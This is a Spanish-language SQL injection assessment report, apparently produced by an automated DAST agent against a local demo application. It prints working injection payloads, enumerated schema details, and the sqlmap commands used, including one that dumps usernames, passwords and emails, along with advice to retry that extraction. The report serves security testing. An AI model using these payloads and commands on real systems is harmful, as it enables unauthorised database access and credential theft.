# Informe de Análisis DAST — SQL Injection

Fecha: 2026-04-13T11:51:34
Objetivo: http://web.dev.local:8083

Resumen Ejecutivo
------------------
Se realizó un análisis dinámico orientado a detectar y explotar vulnerabilidades de SQL Injection en el objetivo. Se identificó un parámetro GET (id) vulnerable a SQLi. sqlmap confirmó múltiples tipos de inyección y permitió enumerar la base de datos y la tabla "users" en la base de datos "sqli_demo". El usuario actual recuperado fue 'root@%'.

Vectores Analizados
-------------------
- GET parameter: id (form on homepage)

Hallazgos
---------
- Parámetro vulnerable: id (GET)
- Tipos detectados: boolean-based blind, error-based, time-based blind, UNION-based
- DBMS: MySQL (MariaDB fork)
- Evidencia de sqlmap (payloads ejecutados):
  - Boolean-based payload:
    id=5029' AND 6551=(SELECT (CASE WHEN (6551=6551) THEN 6551 ELSE (SELECT 2428 UNION SELECT 1249) END))-- -&Submit=Submit
  - Error-based payload:
    id=5029' OR (SELECT 8777 FROM(SELECT COUNT(*),CONCAT(0x71717a6a71,(SELECT (ELT(8777=8777,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mTmP&Submit=Submit
  - Time-based payload:
    id=5029' AND (SELECT 7778 FROM (SELECT(SLEEP(5)))JVzb)-- YZiE&Submit=Submit
  - UNION payload:
    id=5029' UNION ALL SELECT NULL,CONCAT(0x71717a6a71,0x7266786d565148786279414c49575057486e62576c7a784d474c536d514662424c6c7042556d474b,0x717a716a71)-- -&Submit=Submit

Explotación y Evidencia
------------------------
- Usuario actual recuperado via sqlmap: 'root@%'
- Bases de datos enumeradas:
  - information_schema
  - mysql
  - performance_schema
  - sqli_demo
  - sys
- Tablas en sqli_demo:
  - users
- Columnas en sqli_demo.users: email, first_name, last_name, password, user_id, username
- Intento de volcado de columnas (username,password,email) fallido por limitaciones del método UNION/time-based en modo multihilo; no se extrajeron filas en esta ejecución automatizada.

Conclusión
----------
Se confirmó que el parámetro 'id' es vulnerable a múltiples técnicas de SQL Injection. Se logró enumerar la base de datos y la estructura de la tabla "users" y recuperar el usuario actual de la base de datos (root). El volcado completo de credenciales no fue exitoso en esta ejecución automatizada, por lo que se recomienda reintentar la extracción con ajustes (por ejemplo: desactivar multithreading, utilizar --hex, aumentar --level, o usar técnicas manuales más específicas).

Recomendaciones
---------------
- Validar y parametrizar las consultas en el backend (usar consultas preparadas / ORM con placeholders).
- Implementar WAF o reglas específicas para detectar payloads de inyección.
- Revisar y rotar credenciales si procede (usuario root mostrado).
- Restringir el acceso a la base de datos desde la red si no es necesario.

Comandos sqlmap ejecutados (resumen)
------------------------------------
- sqlmap -u "http://web.dev.local:8083/?id=1" --batch --level=3 --risk=2 --threads=2 -v 1
- sqlmap -u "http://web.dev.local:8083/?id=1" --batch --dbs --current-user --level=3 --risk=2 --threads=2 -v 1
- sqlmap -u "http://web.dev.local:8083/?id=1" -D sqli_demo --tables --batch --level=3 --risk=2 --threads=2 -v 1
- sqlmap -u "http://web.dev.local:8083/?id=1" -D sqli_demo -T users --columns --batch --level=3 --risk=2 --threads=2 -v 1
- sqlmap -u "http://web.dev.local:8083/?id=1" -D sqli_demo -T users -C username,password,email --dump --batch --level=3 --risk=2 --threads=2 -v 1

Archivos de evidencia
---------------------
- sqlmap output directory: /home/kali_rdp/.local/share/sqlmap/output/web.dev.local

Informe generado por: Agente DAST automatizado
